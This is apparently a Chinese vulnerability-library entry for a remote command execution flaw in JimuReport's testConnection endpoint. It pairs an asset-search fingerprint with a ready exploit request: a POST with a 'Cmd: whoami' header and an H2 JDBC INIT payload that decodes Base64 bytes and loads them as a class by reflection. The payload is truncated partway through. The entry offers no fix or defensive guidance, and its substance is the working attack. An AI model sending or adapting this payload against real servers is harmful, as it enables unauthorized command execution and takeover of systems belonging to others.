# 积木报表testConnection存在远程命令执行漏洞

- **系统**：积木报表　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`web.body="积木报表"`
- **请求**：`POST /jmreport/testConnection HTTP/1.1`
- **关键头**：`Content-Type: application/json`　`Cmd: whoami`　`Content-Length: 8902`

**请求体 / payload**
```
"id":"1",
"code":"ABC",
"dbType":"MySQL",
"dbDriver":"org.h2.Driver",
"dbUrl":"jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS EXEC AS 'void shellexec(String b) throws Exception {byte[] bytes\\;try{bytes=java.util.Base64.getDecoder().decode(b)\\;}catch (Exception e){e.printStackTrace()\\;bytes=javax.xml.bind.DatatypeConverter.parseBase64Binary(b)\\;}java.lang.reflect.Method defineClassMethod = java.lang.ClassLoader.class.getDeclaredMethod(\\\"defineClass\\\", byte[].class,int.class,int.class)\\;defineClassMethod.setAccessible(true)\\;Class clz=(Class)defineClassMethod.invoke(new …（脚本共 8810 字，完整版见原文）
```

**其他**
- 积木报表testConnection存在远程命令执行漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 积木报表